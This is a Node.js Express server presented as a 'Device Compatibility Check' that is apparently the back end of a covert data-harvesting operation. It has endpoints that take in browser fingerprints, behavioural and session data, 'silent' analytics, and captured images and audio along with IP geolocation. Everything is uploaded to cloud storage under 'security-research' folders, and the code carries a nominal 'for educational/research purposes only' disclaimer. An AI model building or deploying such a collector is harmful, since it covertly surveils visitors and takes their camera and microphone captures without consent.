const cloudinary = require('cloudinary').v2;
const express = require('express');
const fs = require('fs');
const path = require('path');
const geoip = require('geoip-lite');

cloudinary.config({
  cloud_name: process.env.CLOUD_NAME,
  api_key: process.env.API_KEY,
  api_secret: process.env.API_SECRET
});

const app = express();

// Enhanced logging system
function logDataCollection(type, data) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    type: type,
    dataSize: JSON.stringify(data).length,
    ip: data.ip || 'unknown'
  };
  
  console.log(`[DATA COLLECTED] ${type}: ${logEntry.dataSize} bytes from ${logEntry.ip}`);
}

app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
  next();
});

function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
}

function getClientInfo(req) {
  const ip = getClientIp(req);
  return {
    ip: ip,
    geo: geoip.lookup(ip),
    userAgent: req.headers['user-agent'],
    referer: req.headers['referer'],
    acceptLanguage: req.headers['accept-language'],
    acceptEncoding: req.headers['accept-encoding'],
    timestamp: new Date().toISOString()
  };
}

// Health check
app.get('/', (req, res) => {
  res.send('Device Compatibility Check - Server Running');
});

// Original fingerprint route (enhanced)
app.post('/collect-fingerprint', async (req, res) => {
  try {
    const fingerprint = {
      ...getClientInfo(req),
      ...req.body
    };

    const base64 = Buffer.from(JSON.stringify(fingerprint)).toString('base64');

    await cloudinary.uploader.upload(`data:application/json;base64,${base64}`, {
      folder: 'security-research/basic-fingerprints',
      public_id: `fingerprint-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      resource_type: 'raw'
    });

    logDataCollection('BASIC_FINGERPRINT', fingerprint);
    res.sendStatus(200);
  } catch (err) {
    console.error('Fingerprint error:', err);
    res.status(500).send('Error saving fingerprint');
  }
});

// Enhanced fingerprint route
app.post('/collect-enhanced-fingerprint', async (req, res) => {
  try {
    const enhancedFingerprint = {
      ...getClientInfo(req),
      ...req.body,
      collectionType: 'ENHANCED_FINGERPRINT'
    };

    const base64 = Buffer.from(JSON.stringify(enhancedFingerprint)).toString('base64');

    await cloudinary.uploader.upload(`data:application/json;base64,${base64}`, {
      folder: 'security-research/enhanced-fingerprints',
      public_id: `enhanced-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      resource_type: 'raw'
    });

    logDataCollection('ENHANCED_FINGERPRINT', enhancedFingerprint);
    res.sendStatus(200);
  } catch (err) {
    console.error('Enhanced fingerprint error:', err);
    res.status(500).send('Error saving enhanced fingerprint');
  }
});

// Behavioral data collection
app.post('/collect-behavioral-data', async (req, res) => {
  try {
    const behavioralData = {
      ...getClientInfo(req),
      ...req.body,
      collectionType: 'BEHAVIORAL_DATA'
    };

    const base64 = Buffer.from(JSON.stringify(behavioralData)).toString('base64');

    await cloudinary.uploader.upload(`data:application/json;base64,${base64}`, {
      folder: 'security-research/behavioral-data',
      public_id: `behavioral-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      resource_type: 'raw'
    });

    logDataCollection('BEHAVIORAL_DATA', behavioralData);
    res.sendStatus(200);
  } catch (err) {
    console.error('Behavioral data error:', err);
    res.status(500).send('Error saving behavioral data');
  }
});

// Enhanced media collection with metadata
app.post('/collect-media', async (req, res) => {
  try {
    const { type, data, extension } = req.body;
    const clientInfo = getClientInfo(req);

    if (!['image', 'audio'].includes(type)) {
      return res.status(400).send('Invalid media type');
    }

    const uploadDataUri = data.startsWith('data:')
      ? data
      : `data:${type}/${extension};base64,${data}`;

    // Upload media file
    const result = await cloudinary.uploader.upload(uploadDataUri, {
      folder: `security-research/media/${type}`,
      resource_type: type === 'audio' ? 'video' : 'image'
    });

    // Also save metadata
    const metadata = {
      ...clientInfo,
      mediaType: type,
      extension: extension,
      mediaUrl: result.secure_url,
      mediaSize: data.length,
      collectionType: 'MEDIA_CAPTURE'
    };

    const metadataBase64 = Buffer.from(JSON.stringify(metadata)).toString('base64');
    await cloudinary.uploader.upload(`data:application/json;base64,${metadataBase64}`, {
      folder: 'security-research/media-metadata',
      public_id: `media-meta-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      resource_type: 'raw'
    });

    logDataCollection('MEDIA_CAPTURE', { type, size: data.length });
    res.sendStatus(200);
  } catch (err) {
    console.error('Media upload error:', err);
    res.status(500).send('Error uploading media');
  }
});

// Session tracking
app.post('/track-session', async (req, res) => {
  try {
    const sessionData = {
      ...getClientInfo(req),
      ...req.body,
      collectionType: 'SESSION_TRACKING'
    };

    const base64 = Buffer.from(JSON.stringify(sessionData)).toString('base64');

    await cloudinary.uploader.upload(`data:application/json;base64,${base64}`, {
      folder: 'security-research/session-tracking',
      public_id: `session-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      resource_type: 'raw'
    });

    logDataCollection('SESSION_TRACKING', sessionData);
    res.sendStatus(200);
  } catch (err) {
    console.error('Session tracking error:', err);
    res.status(500).send('Error saving session data');
  }
});

// Error logging with enhanced details
app.post('/log-error', (req, res) => {
  try {
    const errorData = {
      ...getClientInfo(req),
      error: req.body.error,
      collectionType: 'ERROR_LOG'
    };
    
    console.error('Client error:', errorData);
    logDataCollection('ERROR_LOG', errorData);
    res.sendStatus(200);
  } catch (err) {
    console.error('Error logging failed:', err);
    res.status(500).send('Error logging error');
  }
});

// Analytics endpoint (silent page view tracking)
app.post('/track-analytics', async (req, res) => {
  try {
    const analyticsData = {
      ...getClientInfo(req),
      ...req.body,
      collectionType: 'ANALYTICS'
    };

    const base64 = Buffer.from(JSON.stringify(analyticsData)).toString('base64');

    await cloudinary.uploader.upload(`data:application/json;base64,${base64}`, {
      folder: 'security-research/analytics',
      public_id: `analytics-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
      resource_type: 'raw'
    });

    logDataCollection('ANALYTICS', analyticsData);
    res.sendStatus(200);
  } catch (err) {
    console.error('Analytics error:', err);
    res.status(500).send('Error saving analytics');
  }
});

// Data export endpoint (for research analysis)
app.get('/export-data/:type', async (req, res) => {
  try {
    const { type } = req.params;
    const validTypes = ['fingerprints', 'behavioral-data', 'media-metadata', 'session-tracking', 'analytics'];
    
    if (!validTypes.includes(type)) {
      return res.status(400).send('Invalid data type');
    }

    // This would typically query your database or cloud storage
    // For now, just return a success message
    res.json({ 
      message: `Data export for ${type} initiated`,
      timestamp: new Date().toISOString()
    });
  } catch (err) {
    console.error('Export error:', err);
    res.status(500).send('Error exporting data');
  }
});

// Statistics endpoint
app.get('/stats', (req, res) => {
  res.json({
    server: 'Security Research Data Collection Server',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    message: 'Data collection active'
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🔒 Security Research Server running on port ${PORT}`);
  console.log(`📊 Data collection endpoints active`);
  console.log(`⚠️  For educational/research purposes only`);
});
